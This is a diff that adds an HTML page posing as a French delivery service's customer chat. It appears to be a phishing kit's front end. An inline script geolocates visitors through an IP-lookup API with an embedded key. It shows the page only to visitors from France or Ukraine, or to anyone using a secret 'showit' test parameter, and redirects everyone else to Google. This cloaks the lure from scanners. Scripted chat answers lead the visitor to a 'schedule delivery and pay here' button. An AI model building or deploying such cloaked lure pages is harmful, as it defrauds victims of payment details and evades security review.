@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Assistance</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="./css/bootstrap.min.css">
+    <link rel="stylesheet" href="./css/style.css">
+    <script src="./js/vue.js"></script>
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+
+    <script>
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || '');
+        }
+        let test = getURLParameter('test')
+        if (test === 'showit') {
+            $(document.body).show();
+        }
+        $.ajax({
+            url: "https://pro.ip-api.com/json?key=T5ZbP45j6XElRsn",
+            success: function (data) {
+                console.log(data);
+                console.log(data.countryCode);
+                    if (test === 'showit' || data.countryCode === 'FR' || data.countryCode === 'UKR'|| data.countryCode === 'UA') {
+                        $(document.body).show();
+                    } else {
+                        location = "https://google.com";
+                    }
+            },
+        });
+
+    </script>
+
+<body>
+<div id="app">
+    <div class="header w-100 p-1">
+        <div class="container f-bold">
+            <div class="row">
+                <div class="col-12 col-md-6 text-center d-none d-md-block">
+                    <p>Service Clients</p>
+                </div>
+                <div class="col-12 col-md-6 text-center text-md-right f-light">
+                    <ul>
+                        <li class="active">Clients privés</li>
+                        <li>Clients professionnels</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div v-if="loaded" id="main-message-wrapper" class="main-message-wrapper pb-2">
+        <div class="main-container">
+            <div class="mt-4 main-message">
+                <message v-for="message in messages" v-bind:message="message"/>
+            </div>
+            <div v-if="typing" class="pt-1">
+                <img src="./img/thumb.png" alt="" class="thumb avatar">
+                <div class="loading-wrapper"><div class="loading-section"><div class="ball" id="one"></div><div class="ball" id="two"></div><div class="ball" id="three"></div></div></div>
+            </div>
+            <div class="answersWrapper">
+                <div class="answers pt-3">
+                    <div v-if="showFirstAnswer" v-on:click="firstAnswer(1)" class="choices choices-1">Oui, c'est moi !</div>
+                    <div v-if="showFirstAnswer" v-on:click="firstAnswer(2)" class="choices choices-1">Non, malheureusement</div>
+                    <div v-if="showSecondAnswer" v-on:click="secondAnswer(1)" class="choices choices-1">Adresse privée, merci</div>
+                    <div v-if="showSecondAnswer" v-on:click="secondAnswer(2)" class="choices choices-1">Adresse professionnelle, merci</div>
+                    <div v-if="showFinalButton" v-on:click="redirect()" class="choices choices-1">Programmez la livraison et réglez ici</div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<script src="./js/app.js"></script>
+</body>
+</html>
